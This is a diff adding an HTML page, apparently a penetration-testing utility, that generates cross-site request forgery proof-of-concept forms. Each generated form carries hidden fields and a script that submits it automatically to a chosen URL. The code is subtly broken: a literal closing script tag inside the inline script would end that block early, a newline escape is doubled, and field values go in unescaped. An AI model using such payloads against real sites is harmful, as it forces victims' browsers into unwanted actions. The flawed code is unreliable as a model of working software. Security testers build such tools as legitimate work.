@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>CSRF PoC Generator</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+<div class="container">
+  <h2>CSRF PoC Generator</h2>
+  <input id="action" placeholder="POST URL" style="width:100%;"><br>
+  <textarea id="fields" rows="5" style="width:100%;" placeholder="key1=value1&key2=value2"></textarea><br>
+  <button onclick="generate()">Generate</button>
+  <pre id="output"></pre>
+</div>
+
+<script>
+function generate() {
+  const action = document.getElementById('action').value;
+  const rawFields = document.getElementById('fields').value;
+  const pairs = rawFields.split('&').map(p => {
+    const [k,v] = p.split('=');
+    return `<input type="hidden" name="${k}" value="${v}">`;
+  }).join("\\n");
+
+  const html = `<form action="${action}" method="POST">\n${pairs}\n<input type="submit" value="Submit">\n</form>\n<script>document.forms[0].submit();</script>`;
+  document.getElementById('output').textContent = html;
+}
+</script>
+</body>
+</html>
